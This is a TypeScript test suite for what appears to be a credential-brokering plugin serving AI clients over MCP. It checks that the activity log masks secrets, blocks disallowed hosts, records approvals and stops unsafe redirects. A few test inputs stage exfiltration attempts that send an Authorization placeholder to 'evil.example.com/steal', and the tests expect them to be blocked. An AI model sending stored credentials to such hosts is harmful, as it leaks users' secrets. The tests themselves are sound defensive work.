import { describe, expect, it } from "vitest";
import { ActivityLog, ActivitySession, MAX_ACTIVITY_SESSIONS, MAX_DATA_CHARS, MAX_SESSION_LINES } from "../src/activity/activityLog";
import { AuditLog } from "../src/audit/auditLog";
import { Broker } from "../src/engine/broker";
import { utf8ToBase64 } from "../src/engine/placeholders";
import { Transport, TransportRequest, TransportResponse } from "../src/engine/transport";
import { ClientContext } from "../src/server/clients";
import { handleMcpMessage } from "../src/server/mcp";
import { ToolRegistry } from "../src/tools/registry";
import { ScriptRunner } from "../src/tools/scriptRunner";
import { ToolsService, ToolsSettings } from "../src/tools/service";
import { secretInput, unlockedStore } from "./helpers";
import { fence, MemorySource } from "./toolHelpers";

const client: ClientContext = { id: "c1", name: "Claude Code", access: { mode: "all" } };
const SECRET = secretInput().value;
const BASIC = utf8ToBase64(`${secretInput().username}:${SECRET}`);
const limits = () => ({ timeoutMs: 5000, maxResponseBytes: 1_000_000, maxRedirects: 5 });

const keys = (s: ActivitySession) => s.lines.map((l) => l.key);
/** Everything the panel can show of a session, as one string. */
const everything = (s: ActivitySession) => JSON.stringify(s);

function okResponse(req: TransportRequest, body: string): TransportResponse {
  return { status: 200, statusText: "OK", headers: { "content-type": "application/json" }, body, bodyEncoding: "text", bodyBytes: body.length, truncated: false, finalUrl: req.url.toString(), redirects: 0 };
}

async function setup(secret = {}, transport?: Transport, approve: (r: unknown) => Promise<boolean> = async () => true) {
  const { store } = await unlockedStore();
  await store.add(secretInput(secret));
  const seen: TransportRequest[] = [];
  const send: Transport =
    transport ??
    (async (req) => {
      seen.push(req);
      // The upstream echoes the credential it received: a classic leak the log must also mask.
      return okResponse(req, JSON.stringify({ echo: req.headers["Authorization"] ?? null, token: SECRET }));
    });
  const activity = new ActivityLog();
  const broker = new Broker(store, send, approve, new AuditLog(), limits, undefined, activity);
  return { store, broker, activity, seen };
}

describe("ActivityLog", () => {
  it("records a session line by line and tells the listeners", () => {
    const log = new ActivityLog();
    const events: string[] = [];
    log.onEvent((e) => events.push(e.type));
    const trace = log.begin({ client: "c", tool: "http_request", source: "mcp" });
    trace.line("info", "act.line.vaultUnlocked");
    trace.request("GET", "https://x.test/a");
    trace.useSecrets(["A", "A", "B"]);
    trace.end("ok", 200);
    const [s] = log.list();
    expect(s).toMatchObject({ status: "ok", httpStatus: 200, method: "GET", target: "https://x.test/a", requests: 1, secrets: ["A", "B"] });
    expect(s.endedAt).toBeDefined();
    expect(keys(s)).toEqual(["act.line.vaultUnlocked", "act.line.finishedOk"]);
    expect(events).toEqual(["begin", "line", "update", "update", "line", "end"]);
  });

  it("only the first end counts", () => {
    const log = new ActivityLog();
    const trace = log.begin({ client: "c", tool: "t", source: "mcp" });
    trace.end("denied");
    trace.end("ok", 200);
    expect(log.list()[0].status).toBe("denied");
    expect(log.list()[0].httpStatus).toBeUndefined();
    expect(keys(log.list()[0]).filter((k) => k === "act.line.finishedFail")).toHaveLength(1);
  });

  it("lists the newest first and clear keeps the running ones", () => {
    const log = new ActivityLog();
    const a = log.begin({ client: "c", tool: "a", source: "mcp" });
    a.end("ok");
    log.begin({ client: "c", tool: "b", source: "mcp" });
    expect(log.list().map((s) => s.tool)).toEqual(["b", "a"]);
    const removed: string[][] = [];
    log.onEvent((e) => e.type === "remove" && removed.push(e.ids));
    log.clear();
    expect(log.list().map((s) => s.tool)).toEqual(["b"]);
    expect(removed).toHaveLength(1);
  });

  it("keeps a bounded number of sessions, dropping finished ones first", () => {
    const log = new ActivityLog();
    const running = log.begin({ client: "c", tool: "running", source: "mcp" });
    for (let i = 0; i < MAX_ACTIVITY_SESSIONS + 5; i++) log.begin({ client: "c", tool: `t${i}`, source: "mcp" }).end("ok");
    expect(log.list()).toHaveLength(MAX_ACTIVITY_SESSIONS);
    expect(log.list().some((s) => s.tool === "running")).toBe(true);
    expect(running.ended).toBe(false);
  });

  it("bounds the lines of a session but always keeps the closing line", () => {
    const log = new ActivityLog();
    const trace = log.begin({ client: "c", tool: "t", source: "mcp" });
    for (let i = 0; i < MAX_SESSION_LINES + 10; i++) trace.line("info", "act.line.vaultUnlocked");
    trace.end("ok");
    const s = log.list()[0];
    expect(s.droppedLines).toBe(10);
    expect(s.lines.at(-1)?.key).toBe("act.line.finishedOk");
  });

  it("cuts long data and says how much", () => {
    const log = new ActivityLog();
    const trace = log.begin({ client: "c", tool: "t", source: "mcp" });
    trace.line("info", "act.line.responseBody", { bytes: 1 }, "x".repeat(MAX_DATA_CHARS + 50));
    const line = log.list()[0].lines[0];
    expect(line.data).toHaveLength(MAX_DATA_CHARS);
    expect(line.omitted).toBe(50);
  });

  it("passes every text through the scrubber, but not numbers", () => {
    const log = new ActivityLog();
    log.setScrubber((text) => text.replaceAll("hunter2", "***"));
    const trace = log.begin({ client: "c", tool: "t", source: "mcp" });
    trace.line("info", "act.line.placeholder", { raw: "hunter2", name: "N", where: "url" }, "the password is hunter2");
    trace.line("info", "act.line.responseReceived", { status: 200, statusText: "OK", bytes: 7 });
    const [first, second] = log.list()[0].lines;
    expect(first.params?.raw).toBe("***");
    expect(first.data).toBe("the password is ***");
    expect(second.params?.bytes).toBe(7);
  });
});

describe("activity of http requests (Broker)", () => {
  const request = { method: "GET", url: "https://acme.atlassian.net/rest/api/3/myself?expand=groups", headers: { Authorization: "{{basic:JIRA_ACME}}", Accept: "application/json" } };

  it("shows what was received, the variable used, the replacement and the response, without any value", async () => {
    const { broker, activity, seen } = await setup();
    const res = await broker.execute(request, client);
    expect(res.ok).toBe(true);
    // The request really went out with the value...
    expect(seen[0].headers["Authorization"]).toBe(`Basic ${BASIC}`);

    // ...and the panel shows the story without it.
    const [s] = activity.list();
    expect(s).toMatchObject({ tool: "http_request", source: "rest", status: "ok", httpStatus: 200, method: "GET", requests: 1, secrets: ["JIRA_ACME"], client: "Claude Code" });
    expect(s.target).toBe("https://acme.atlassian.net/rest/api/3/myself");
    expect(keys(s)).toEqual([
      "act.line.requestReceived",
      "act.line.headersReceived",
      "act.line.vaultUnlocked",
      "act.line.placeholdersFound",
      "act.line.placeholder",
      "act.line.policyHosts",
      "act.line.substituting",
      "act.line.substituted",
      "act.line.approvalNotNeeded",
      "act.line.sending",
      "act.line.responseReceived",
      "act.line.responseHeaders",
      "act.line.masked",
      "act.line.responseBody",
      "act.line.finishedOk",
    ]);
    const by = (key: string) => s.lines.find((l) => l.key === key)!;
    expect(by("act.line.requestReceived").params).toEqual({ method: "GET", url: request.url });
    expect(by("act.line.headersReceived").data).toContain("Authorization: {{basic:JIRA_ACME}}");
    expect(by("act.line.placeholder").params).toEqual({ raw: "{{basic:JIRA_ACME}}", name: "JIRA_ACME", where: "header Authorization" });
    expect(by("act.line.substituted").params).toEqual({ raw: "{{basic:JIRA_ACME}}", mask: "Basic ********", where: "header Authorization" });
    expect(by("act.line.policyHosts").params).toMatchObject({ name: "JIRA_ACME", host: "acme.atlassian.net", where: "header Authorization" });
    // The echoed credential and token in the response are masked, and the count is shown.
    expect(Number(by("act.line.masked").params?.n)).toBeGreaterThan(0);
    expect(by("act.line.responseBody").data).not.toContain(SECRET);

    const all = everything(s);
    for (const leak of [SECRET, BASIC, `Basic ${BASIC}`, "super-secret"]) expect(all).not.toContain(leak);
  });

  it("masks a value the AI typed itself, in the request it shows", async () => {
    const { broker, activity } = await setup();
    await broker.execute({ method: "POST", url: "https://acme.atlassian.net/x", headers: { "X-Debug": SECRET, Authorization: "{{basic:JIRA_ACME}}" }, body: JSON.stringify({ t: SECRET }) }, client);
    const all = everything(activity.list()[0]);
    expect(all).not.toContain(SECRET);
    expect(all).toContain("X-Debug: ***");
  });

  it("closes a blocked request with the reason", async () => {
    const { broker, activity, seen } = await setup();
    const res = await broker.execute({ url: "https://evil.example.com/steal", headers: { Authorization: "{{basic:JIRA_ACME}}" } }, client);
    expect(res.ok).toBe(false);
    expect(seen).toHaveLength(0);
    const [s] = activity.list();
    expect(s.status).toBe("blocked");
    expect(keys(s)).toContain("act.line.blocked");
    expect(s.lines.find((l) => l.key === "act.line.blocked")?.params?.code).toBe("host_not_allowed");
    expect(keys(s)).not.toContain("act.line.sending");
    expect(s.secrets).toEqual([]);
  });

  it("closes the session as locked when the vault is locked", async () => {
    const { broker, activity, store } = await setup();
    store.lock();
    await broker.execute(request, client);
    const [s] = activity.list();
    expect(s.status).toBe("locked");
    expect(keys(s)).toContain("act.line.vaultLocked");
  });

  it("shows the wait for approval, and a denial", async () => {
    let asked = false;
    const { broker, activity, seen } = await setup({ approval: "always" }, undefined, async () => {
      asked = true;
      // While Obsidian waits for the user, the session is still running and says so.
      const running = activity.list()[0];
      expect(running.status).toBe("running");
      expect(keys(running).at(-1)).toBe("act.line.approvalWaiting");
      return false;
    });
    const res = await broker.execute(request, client);
    expect(asked).toBe(true);
    expect(res.ok).toBe(false);
    expect(seen).toHaveLength(0);
    const [s] = activity.list();
    expect(s.status).toBe("denied");
    expect(keys(s)).toContain("act.line.approvalDenied");
  });

  it("shows an approval that was granted", async () => {
    const { broker, activity } = await setup({ approval: "always" });
    await broker.execute(request, client);
    expect(keys(activity.list()[0])).toContain("act.line.approvalGranted");
  });

  it("shows redirects and whether they were followed", async () => {
    const transport: Transport = async (req) => {
      expect(req.redirectDecision(new URL("https://acme.atlassian.net/other"), 302)).toBe("follow");
      expect(req.redirectDecision(new URL("https://evil.example.com/x?token=1"), 302)).toBe("stop");
      return okResponse(req, "{}");
    };
    const { broker, activity } = await setup({}, transport);
    await broker.execute(request, client);
    const redirects = activity.list()[0].lines.filter((l) => l.key.startsWith("act.line.redirect"));
    expect(redirects.map((l) => l.key)).toEqual(["act.line.redirectFollow", "act.line.redirectStop"]);
    // Origin and path only: a query string could carry a value.
    expect(redirects[1].params?.to).toBe("https://evil.example.com/x");
  });

  it("closes the session with the network error, masked", async () => {
    const transport: Transport = async () => {
      throw new Error(`connect ECONNREFUSED while sending ${SECRET}`);
    };
    const { broker, activity } = await setup({}, transport);
    const res = await broker.execute(request, client);
    expect(res.ok).toBe(false);
    const [s] = activity.list();
    expect(s.status).toBe("error");
    expect(keys(s)).toContain("act.line.transportError");
    expect(everything(s)).not.toContain(SECRET);
  });

  it("logs a request without placeholders as nothing to replace", async () => {
    const { broker, activity } = await setup();
    await broker.execute({ url: "https://acme.atlassian.net/public" }, client);
    const [s] = activity.list();
    expect(keys(s)).toContain("act.line.noPlaceholders");
    expect(s.secrets).toEqual([]);
  });

  it("logs list_secrets with the names only", async () => {
    const { broker, activity } = await setup();
    broker.listSecrets(client);
    const [s] = activity.list();
    expect(s).toMatchObject({ tool: "list_secrets", status: "ok" });
    expect(s.lines.find((l) => l.key === "act.line.listResult")).toMatchObject({ params: { n: 1 }, data: "JIRA_ACME" });
    expect(everything(s)).not.toContain(SECRET);
  });

  it("does not make a new session when the request belongs to one that is open", async () => {
    const { broker, activity } = await setup();
    const trace = activity.begin({ client: client.name, tool: "x", source: "mcp" });
    await broker.execute(request, client, { trace });
    expect(activity.list()).toHaveLength(1);
    expect(trace.ended).toBe(false);
  });
});

describe("activity of MCP calls", () => {
  async function mcp(secret = {}) {
    const { store, broker, activity } = await setup(secret);
    const source = new MemorySource();
    const settings: ToolsSettings = { toolsEnabled: true, scriptsEnabled: true, toolTag: "mcp/tool", requestTag: "api/request", scriptTimeoutSeconds: 5, maxResponseMB: 1 };
    source.add("Services/Svc.md", { url: "https://acme.atlassian.net", auth: "{{basic:JIRA_ACME}}" });
    source.add("Requests/Get item.md", { tags: ["api/request"], service: "[[Svc]]" }, [`${fence}http`, "GET {{service.url}}/items/{{param:id}}", "Authorization: {{service.auth}}", fence].join("\n"));
    source.add("Tools/get_item.md", { tags: ["mcp/tool"], tool: "get_item", kind: "request", request: "[[Get item]]", description: "Gets an item.", params: { id: { type: "string", required: true } } });
    source.add(
      "Tools/digest.md",
      { tags: ["mcp/tool"], tool: "item_digest", kind: "script", description: "Digest.", params: { id: { type: "string", required: true } } },
      [`${fence}js`, "export default async function (ctx) {", '  const r = await ctx.requests.run("Get item", { id: ctx.args.id });', "  return { status: r.status };", "}", fence].join("\n"),
    );
    const registry = new ToolRegistry(source, () => ({ enabled: true, toolTag: settings.toolTag, scriptsEnabled: true }));
    const tools = new ToolsService({ registry, source, broker, runner: new ScriptRunner(), audit: new AuditLog(), settings: () => settings, guide: () => "guide" });
    await registry.refresh();
    const call = (name: string, args: unknown) => handleMcpMessage({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } }, { broker, client, version: "test", tools });
    return { store, activity, call };
  }

  it("makes one session per http_request call", async () => {
    const { activity, call } = await mcp();
    await call("http_request", { url: "https://acme.atlassian.net/rest/api/3/myself", headers: { Authorization: "{{basic:JIRA_ACME}}" } });
    const sessions = activity.list();
    expect(sessions).toHaveLength(1);
    expect(sessions[0]).toMatchObject({ tool: "http_request", source: "mcp", status: "ok", httpStatus: 200, secrets: ["JIRA_ACME"], client: "Claude Code" });
    expect(keys(sessions[0])[0]).toBe("act.line.mcpCall");
    expect(everything(sessions[0])).not.toContain(SECRET);
  });

  it("closes an http_request that was blocked as blocked", async () => {
    const { activity, call } = await mcp();
    const out = await call("http_request", { url: "https://evil.example.com/", headers: { Authorization: "{{basic:JIRA_ACME}}" } });
    expect((out as { result: { isError: boolean } }).result.isError).toBe(true);
    expect(activity.list()[0].status).toBe("blocked");
  });

  it("shows list_secrets and an unknown tool", async () => {
    const { activity, call } = await mcp();
    await call("list_secrets", {});
    await call("nope", {});
    const [unknown, list] = activity.list();
    expect(list).toMatchObject({ tool: "list_secrets", status: "ok", source: "mcp" });
    expect(unknown).toMatchObject({ tool: "nope", status: "error" });
    expect(keys(unknown)).toContain("act.line.unknownTool");
  });

  it("names the vault tool that really ran, even through run_vault_tool", async () => {
    const { activity, call } = await mcp();
    await call("run_vault_tool", { name: "get_item", arguments: { id: "7" } });
    const [s] = activity.list();
    expect(s).toMatchObject({ tool: "get_item", via: "run_vault_tool", status: "ok", requests: 1, secrets: ["JIRA_ACME"] });
    expect(keys(s)).toEqual(expect.arrayContaining(["act.line.toolReceived", "act.line.requestN", "act.line.substituted", "act.line.approvalNotNeeded", "act.line.toolResult"]));
    expect(s.lines.find((l) => l.key === "act.line.toolReceived")?.data).toContain('"id": "7"');
    expect(everything(s)).not.toContain(SECRET);
  });

  it("shows a vault tool called directly, with the requests of its script", async () => {
    const { activity, call } = await mcp();
    await call("item_digest", { id: "9" });
    const [s] = activity.list();
    expect(s).toMatchObject({ tool: "item_digest", status: "ok", requests: 1, secrets: ["JIRA_ACME"] });
    expect(s.via).toBeUndefined();
    expect(keys(s)).toEqual(expect.arrayContaining(["act.line.toolScript", "act.line.scriptCall", "act.line.requestN"]));
  });

  it("closes a vault tool that fails with its error", async () => {
    const { activity, call } = await mcp();
    await call("get_item", {});
    const [s] = activity.list();
    expect(s).toMatchObject({ tool: "get_item", status: "error" });
    expect(keys(s)).toContain("act.line.toolFailed");
  });

  it("does not open a second session for the inner request of a vault tool", async () => {
    const { activity, call } = await mcp();
    await call("get_item", { id: "1" });
    expect(activity.list()).toHaveLength(1);
  });
});
